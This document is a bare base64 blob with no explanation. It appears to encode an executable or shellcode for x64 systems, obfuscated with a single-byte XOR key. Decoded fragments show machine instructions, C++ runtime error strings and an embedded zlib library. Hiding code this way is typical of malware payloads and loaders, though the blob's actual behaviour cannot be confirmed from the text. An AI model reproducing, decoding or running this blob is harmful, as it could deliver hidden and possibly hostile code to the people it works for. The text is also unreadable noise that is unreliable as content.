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uunoX5qdhxIXF/6TxOnoX5qdVxcXF/5z0+noX5qdhxcXF/7/w+noX5qdvxcXF/5Xp+noX5qdTxcXF/4zqunoX5qdPxcXF/5vh+noV0JfnP1fnBYk3pYvEhcX1xiD1pzWStTbV0JflPs3X5z9nVpXX5TTN0r+neXp6NtXQl+U+zdfnP3/iOfp6J1aL1+U0zdK/nnl6ejbV0JflPsnX5z9X5wWnAdfnlszP55DMzdbmhoQ5OnoW5xSZ5xCf1+cWnf/2Pjp6IdflNMnStTbV0RCX5T7X1+c/V+eWkdfnlpf/zcG6OhfnJqHFxcXX55fZ1+cUl9fnA//Hgbo6F+cXC9fnl9/X5xaX9FTMy8WX5RzMycXlHMzPxdfnJKnFxcXX55TMzdbnJq/FxcXW5yStxcXF1+cgo8XFxdfnB7/HzTo6P+oB+joX5R3ZxfQUlcWFxcXrxYXFxdflNNfSkzU21dCX5T7N1+c/STXL1IvGILXX5TTN0rU21dCX5T7N1+c/V+eWk9bmlI3X5yCrxcXF//KBOjoh1+U0zdK1NtXREJflPs/X5z9X5xaL//l6OnolGo3F2ItX5yKrxcXF5YsdGR692I8lGwPE2IynFQ3OjcShA6U7xVgD1+cXD//thXo6JLXYxylFl+c3P8QFejoh/8GB+joX5ya1xcXF1+eXzf/Fgfo6F+cWldfnl8/X5TTP0pM1NtXQl+U+zdfnP3/pBXo6IdflNM3StTbV0JflPs3X5z9/9oY6OiUbycXaR//1Rjo6OhfJ1+U0zdK1NtXQl+U+zdfnP1fnBacH/+2X+joh1+U0zdK1NtXQl+U+zdfnP0k3l+U0zdK/q+S6OjbV0JflPs3X5z9X5xSX5wfX5TTN0r+iZLo6NtXQl+U+zdfnP1fnFJPnB9flNM3Sv6Tkujo21dCX5T7N1+c/a4QFxcXX5TTN0r+fJLo6NtXQl+U+zdfnP2uEhcXF1+U0zdK/kWS6OjbV0JflPs3X5z9l2pnF2McrhQXFxf/L5Lo6IdflNM3StTbV0JflPs3X5z9X5xaX1+cHl+U0zdK/llt6OjbV0JflPs3X5z9X5ySjxcXF5wfX5TTN0r+7pPo6NtXQl+U+zdfnP2uExcXF1+U0zdK/veT6OjbV0JflPs3X5z9rh8XFxdflNM3Sv7Qk+jo21dCX5T7N1+c/ZxaR1+U0zdK/uPR6OjbV0JflPs3X5z9X5xaJ1+U0zdK/sdu6OjbV0JflPs3X5z9X5xSX5wfX5TTN0r+1dHo6NtXQl+U+zdfnP1fnBaWLxIXF9djG5YvChcX12MTJNf8Eq8WFxcXX5TTN0rU29vb29vb29vb21dCX5T7N1+c/V+cFiTeli8SFxfXGIPWnNZflNM3StTbX5T7P1+cGhI1Fhf/t/zp6F+cGuY2Fhf/g/zp6F+cGuI2FhdflDLyNhYXF+gCUAMXF1+U0z9f6DJbAxcXX5T7P1+cGp42Fhdfkt5jGv9I/OnoX5QyYDYWFxdflNM/1BcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF2uoFRcXFxcXf6gVFxcXFxcF1xUXFxcXF+moFRcXFxcX+6gVFxcXFxfNqBUXFxcXF9+oFRcXFxcXr6gVFxcXFxe3qBUXFxcXF5uoFRcXFxcXRagVFxcXFxcXFxcXFxcXF8GpFRcXFxcX8akVFxcXFxcpqBUXFxcXFzOoFRcXFxcXA6gVFxcXFxfpqRUXFxcXF+WpFRcXFxcXFxcXFxcXFxer1xUXFxcXFxcXFxcXFxcXS6sVFxcXFxd/qxUXFxcXF2GrFRcXFxcXkasVFxcXFxeDqxUXFxcXF7WrFRcXFxcXoasVFxcXFxfRqxUXFxcXF82rFRcXFxcX/asVFxcXFxftqxUXFxcXFxmqFRcXFxcXN6oVFxcXFxcnqhUXFxcXFyuqFRcXFxcXQ6oVFxcXFxd5qhUXFxcXF5uqFRcXFxcXi6oVFxcXFxevqhUXFxcXF9uqFRcXFxcX8aoVFxcXFxfhqhUXFxcXFxGpFRcXFxcXD6kVFxcXFxc9qRUXFxcXF1GpFRcXFxcXc9IVFxcXFxdZqxUXFxcXFynSFRcXFxcXOdIVFxcXFxcN0hUXFxcXFxvSFRcXFxcXF9IVFxcXFxfn0xUXFxcXF8nTFRcXFxcXKasVFxcXFxc5qxUXFxcXFw2rFRcXFxcXHasVFxcXFxfvrBUXFxcXF/usFRcXFxcXwawVFxcXFxfTrBUXFxcXF7msFRcXFxcXi6wVFxcXFxeZrBUXFxcXF5GsFRcXFxcXZ6wVFxcXFxdNrBUXFxcXF12sFRcXFxcXOawVFxcXFxc3rBUXFxcXFxusFRcXFxcXF6wVFxcXFxfjrRUXFxcXF9vTFRcXFxcXpdMVFxcXFxeP0xUXFxcXF5HTFRcXFxcXY9MVFxcXFxd/0xUXFxcXF0vTFRcXFxcXXdMVFxcXFxdl0hUXFxcXFyHTFRcXFxcXMdMVFxcXFxdH0hUXFxcXF/+tFRcXFxcXD9MVFxcXFxct1hUXFxcXF1nWFRcXFxcXf9YVFxcXFxdr1hUXFxcXF4/WFRcXFxcXodYVFxcXFxfF1hUXFxcXF/HWFRcXFxcX79YVFxcXFxcb1RUXFxcXFzHVFRcXFxcXK9UVFxcXFxdF1RUXFxcXF3vVFRcXFxcXldUVFxcXFxeH1RUXFxcXF7/VFRcXFxcXq9UVFxcXFxfZ1RUXFxcXF8nVFRcXFxcX+dUVFxcXFxcR1BUXFxcXFwnUFRcXFxcXIdQVFxcXFxdJ1BUXFxcXF33UFRcXFxcXb9QVFxcXFxeR1BUXFxcXF4fUFRcXFxcXidQVFxcXFxen1BUXFxcXF9XUFRcXFxcXx9QVFxcXFxfx1BUXFxcXF+XUFRcXFxcX6dQVFxcXFxcf0xUXFxcXFxcXFxcXFxcXZ9cVFxcXFxdN1xUXFxcXF5PXFRcXFxcXFxcXFxcXFxe1qRUXFxcXF4OpFRcXFxcXY6kVFxcXFxdzqRUXFxcXF7mpFRcXFxcXlakVFxcXFxfVqRUXFxcXFxcXFxcXFxcXABcXFxcXF5cuFxcXFxcXlwcXFxcXFxeXHhcXFxcXF5cTFxcXFxcXlwQXFxcXFxeXHBcXFxcXF5dkFxcXFxcXlyMXFxcXFxeXFBcXFxcXF5ez1xUXFxcXF2MXFxcXFxeXGxcXFxcXF5cCFxcXFxcXlxcXFxcXFxcX9dcVFxcXFxft1xUXFxcXFxnWFRcXFxcXFxcXFxcXFxdX1xUXFxcXFznXFRcXFxcXFxcXFxcXFxcb3ReXFhcXFzfcFpcWFxcXZ9wWlxYXFxf33BaXFhcXFxcXFxcXFxcX60EXlxYXFxe7QBeXFhcXFxcXFxcXFxcXFxcXFxcXFxcPXxaXFhcXF6+1FpcWFxcX16oWlxYXFxcXFxcXFxcXFxcXFxcXFxcXV10WlxYXFxc71haXFhcXFy9eFpcWFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX98gVlxYXFxeX9xWXFhcXFxcXFxcXFxcXX4IVlxYXFxdj3heXFhcXF+/eF5cWFxcXQnl8eXhgeTdyb3RyZ2N+eHkXFxcXFxcX14IVlxYXFxdj3heXFhcXF+/eF5cWFxcXdXZzN3Z7e3h0dmN+eHkXF1eBFZcWFxcXY94XlxYXFxfv3heXFhcXF3V2czd2ZWV2bjd5cmA3e3J5cGN/FxcXF9+BFZcWFxcXB90XlxYXFxcmOSU5LxcXFxcXFxcXFxcXN3NycXt2Y3I3JjklOS83VHhnbmV+cH9jNyYuLiI6JScmJDddcnZ5Ont4Ymc3UHZ+e3tuN3Z5czdadmV8N1Zze3JlNxcmOSU5LxcXFxcXFxcXFxcXFxcXF+cBF5cWFxcXExcTFx8XExf3DxeXFhcXFxMXEhcHFx8X9w8XlxYXFxcTFxEXNxc3F/cPF5cWFxcXExcTFwcXBxfnCxeXFhcXFx8XBxc3FzcX5wsXlxYXFxcfFwcXlxeXF+cLF5cWFxcXHxc3F5cXFxbnCxeXFhcXFzcXlxcVFhcT5wsXlxYXFxc3FxUWFRYXB+cLF5cWFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcWFxcXFhcXFxYXFxcWFxcXFRcXFxUXFxcVFxcXFRcXFxQXFxcUFxcXFBcXFxQXFxcTFxcXExcXFxMXFxcTFxcXEhcXFxIXFxcSFxcXEhcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFhcXFxYXFxcVFxcXFRcXFxQXFxcUFxcXExcXFxMXFxcSFxcXEhcXFxEXFxcRFxcXEBcXFxAXFxcfFxcXHxcXFx4XFxceFxcXHRcXFx0XFxccFxcXHBcXFxsXFxcbFxcXGhcXFxoXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcVFxcXFBcXFxAXFxcXFxcXBwYFFx8QHhEdEhwTGxQaFRkWGBcXFxcXFxcXFxcXFxcbFx8XmxcfF1sXHxfbFx8XOxcfF7sXHxd7Fx8X+xcfFwsXHxeLFx8XSxcfF8sXHxcrFx8XqxcfF2sXHxfrFx8XFRcfF5UXHxdVFx8X1RcfFzUXHxe1Fx8XdRcfF/UXHxcFFx8XhRcfF0UXHxfFFx8XJRcfF6UXHxdlFx8X5RcfFx0XHxedFx8XXRcfF90XHxc9Fx8XvRcfF30XHxf9Fx8XDRcfF40XHxdNFx8XzRcfFy0XHxetFx8XbRcfF+0XHxcRFx8XkRcfF1EXHxfRFx8XMRcfF7EXHxdxFx8X8RcfFwEXHxeBFx8XQRcfF8EXHxchFx8XoRcfF2EXHxfhFx8XGRcfF5kXHxdZFx8X2RcfFzkXHxe5Fx8XeRcfF/kXHxcJFx8XiRcfF0kXHxfJFx8XKRcfF6kXHxdpFx8X6RcfFxYXHxeWFx8XVhcfF9YXHxc2Fx8XthcfF3YXHxf2Fx8XBhcfF4YXHxdGFx8XxhcfFyYXHxemFx8XZhcfF+YXHxceFx8XnhcfF14XHxfeFx8XPhcfF74XHxd+Fx8X/hcfFw4XHxeOFx8XThcfF84XHxcuFx8XrhcfF24XHxfuFx8XEhcfF5IXHxdSFx8X0hcfFzIXHxeyFx8XchcfF/IXHxcCFx8XghcfF0IXHxfCFx8XIhcfF6IXHxdiFx8X4hcfFxoXHxeaFx8XWhcfF9oXHxc6Fx8XuhcfF3oXHxf6Fx8XChcfF4oXHxdKFx8XyhcfFyoXHxeqFx8XahcfF+oXHxcEFx4XBBYeF4QXHheEFh4XRBceF0QWHhfEFx4XxBYeFyQXHhckFh4XpBceF6QWHhdkFx4XZBYeF+QXHhfkFh4XHBceFxwWHhecFx4XnBYeF1wXHhdcFh4X3BceF9wWHhc8Fx4XPBYeF7wXHhe8Fh4XfBceF3wWHhf8Fx4X/BYeFwwXHhcMFh4XjBceF4wWHhdMFx4XTBYeF8wXHhfMFh4XLBceFywWHhes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